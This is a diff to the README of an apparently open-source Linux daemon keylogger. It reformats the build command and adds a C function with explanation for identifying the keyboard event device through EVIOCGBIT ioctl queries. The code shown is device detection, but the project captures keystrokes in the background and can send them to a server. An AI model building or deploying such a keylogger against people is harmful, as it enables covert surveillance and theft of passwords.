@@ -29,7 +29,12 @@
 
 <H3 id="Compiling"> Compiling </H3>
 
-In order to compile the program, run this command: <code>gcc main.c keylogger.c daemon.c -o daemon-keylogger</code>.
+In order to compile the program, run this command: 
+```
+
+gcc main.c keylogger.c daemon.c -o daemon-keylogger
+
+```
 
 <H3 id="Arguments"> Command line arguments </H3>
 
@@ -61,23 +66,39 @@ First of all, you have to specify where to send the events, to a server or local
 </ol>
 
 <H3 id="Finding"> Finding keyboard device </H3>
-The event interface exposes the raw events to userspace through a collection of character device nodes, one character device node per logical input device(keyboard, mouse, joystick, power buttons, ..). At this point we know where our keyboard character device can be found, but how can we know if a character device is actually a keyboard one? Well, we can use the event API, which will allow us to query the capabilities and characteristics of input character devices.
-  ```c
-  if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) >= 0) /* Getting bit events supported by device */
+The event interface exposes the raw events to userspace through a collection of character device nodes, one character device node per logical input device(keyboard, mouse, joystick, power buttons, ..). At this point we know where our keyboard character device can be found, but how can we know if a character device is actually a keyboard one? Well, we can use the event API (EVIOC* functions), which will allow us to query the capabilities and characteristics of an input character device.
+
+   ```
+   
+int isKeyboardDevice(char *path, int *keyboard_device)
+{
+    int32_t events_bitmask = 0;
+    int32_t keys_bitmask = 0;
+    int32_t keys = KEY_Q | KEY_A | KEY_Z | KEY_1 | KEY_9;
+    int fd;
+
+    fd = open(path, O_RDONLY);
+
+    if (fd < 0)
+        syslog(LOG_ERR, "Couldn't open %s: %s", path, strerror(errno));
+
+    if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) >= 0)
     {
-        if ((events_bitmask & EV_KEY) == EV_KEY) /* If EV_KEY bit is set then it could be a Keyboard, 
-                                                    but it can be a false positive (for example, power button has this bit set but it is not a kbd) */
+        if ((events_bitmask & EV_KEY) == EV_KEY) 
         {
             if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys_bitmask)), &keys_bitmask) >= 0)
-                if ((keys & keys_bitmask) == keys) /* If it support those keys then good chances are that we just found the keyboard device */
+                if ((keys & keys_bitmask) == keys)
                 {
                     *keyboard_device = fd;
                     return 1;
                 }
         }
     }
-  ```
-  
+    close(fd);
+    return 0;
+}
     
-     
-
+      ```
+The first ioctl call allows us to get the event bits, that is, a bitmask expressing all the capabilities or features supported by the device, it can tell us if, for example, the device has keys or buttons or if it a mouse.
+If EV_KEY bit is set then we have found a device that has keys or buttons, but we cannot yet be sure that it is a keyboard! A power button will have this bit set but it is not obviously a keyboard. 
+However, EVIOCGBIT permits us to make more precise queries about the specific device features, in our case, the second ioctl call, will allow us to get to know if the device supports "q", "a", "z", "1" and "9".
